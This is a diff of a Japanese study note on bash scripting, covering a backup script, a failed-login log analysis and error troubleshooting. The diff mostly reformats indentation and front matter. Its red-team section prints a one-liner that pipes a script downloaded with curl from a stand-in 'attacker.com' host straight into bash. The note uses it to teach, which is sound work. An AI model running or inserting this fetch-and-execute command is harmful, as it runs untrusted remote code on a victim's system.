@@ -1,17 +1,8 @@
 ---
-tags:
-  - 'shell'
-  - 'bash'
-  - 'scripting'
-  - 'automation'
-  - 'bash'
-  - 'chmod'
-  - 'environment_variables'
-  - 'pipes_redirections'
+tags: ['shell' 'bash' 'scripting' 'automation' 'bash' 'chmod' 'environment_variables' 'pipes_redirections']
 created: 2025-06-29 15:02
-modified: 2026-01-18 15:02
-environment:
-  - OS/Linux
+modified: 2026-02-20 15:20
+environment: [OS/Linux]
 vulnearability: []
 knowledge_category: Coding
 ---
@@ -89,24 +80,36 @@ chmod +x my_script.sh
 * **解説**: スクリプトに引数としてバックアップ対象ディレクトリを渡し、存在チェックを行った上で、日付を含むファイル名で `tar` を実行します。
 * **例 (`backup.sh`)**:
 
-    ```bash
+		```bash
+
     #!/bin/bash
+
     set -e # 失敗したら即座に終了
 
     TARGET_DIR="$1"
+
     BACKUP_DIR="/mnt/backups"
+
     TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
+
     FILENAME="backup-${TIMESTAMP}.tar.gz"
 
     if [ -z "$TARGET_DIR" ]; then
+
       echo "Error: Target directory not specified." >&2
+
       exit 1
+
     fi
 
     echo "Backing up ${TARGET_DIR} to ${BACKUP_DIR}/${FILENAME}..."
+
     tar -czf "${BACKUP_DIR}/${FILENAME}" "${TARGET_DIR}"
+
     echo "Backup complete."
+
     ```
+
 
 ### 2\. ブルーチーム視点
 
@@ -115,11 +118,16 @@ chmod +x my_script.sh
 * **解説**: 複数のテキスト処理コマンドをパイプで繋ぎ、大量のログから意味のある情報を抽出します。
 * **例 (`analyze_log.sh`)**:
 
-    ```bash
+		```bash
+
     #!/bin/bash
+
     LOG_FILE="$1"
+
     grep "Failed password" "$LOG_FILE" | awk '{print $11}' | sort | uniq -c | sort -nr
+
     ```
+
 
 ### 3\. レッドチーム視点
 
@@ -128,10 +136,13 @@ chmod +x my_script.sh
 * **解説**: `curl`でダウンロードしたスクリプトをファイルに保存せず、直接 `bash` に渡して実行させます。
 * **例 (ワンライナー)**:
 
-    ```bash
+		```bash
     # curlでスクリプトをダウンロードし、bashで直接実行する
+
     curl -s [http://attacker.com/payload.sh](http://attacker.com/payload.sh) | bash
+
     ```
+
 
 ## エラーメッセージとトラブルシューティング
 
@@ -141,13 +152,13 @@ chmod +x my_script.sh
 
 1. **エラーメッセージ例 1**: `command not found`
 
-      * **考えられる原因**: `PATH` が通っていないか、コマンドのタイプミス。スクリプト内で `cd` して相対パスが変わった可能性もあります。
-      * **解決策**: コマンドをフルパスで指定するか、`PATH` を確認します。
+			* **考えられる原因**: `PATH` が通っていないか、コマンドのタイプミス。スクリプト内で `cd` して相対パスが変わった可能性もあります。
+			* **解決策**: コマンドをフルパスで指定するか、`PATH` を確認します。
 
 2. **エラーメッセージ例 2**: `[: too many arguments`
 
-      * **考えられる原因**: `if [ $VAR == "some string" ]` のように、スペースを含む可能性のある変数をダブルクォートで囲んでいません。
-      * **解決策**: `if [ "$VAR" == "some string" ]` のように、必ず変数をダブルクォートで囲んでください。
+			* **考えられる原因**: `if [ $VAR == "some string" ]` のように、スペースを含む可能性のある変数をダブルクォートで囲んでいません。
+			* **解決策**: `if [ "$VAR" == "some string" ]` のように、必ず変数をダブルクォートで囲んでください。
 
 ## 環境変数と設定ファイル
 
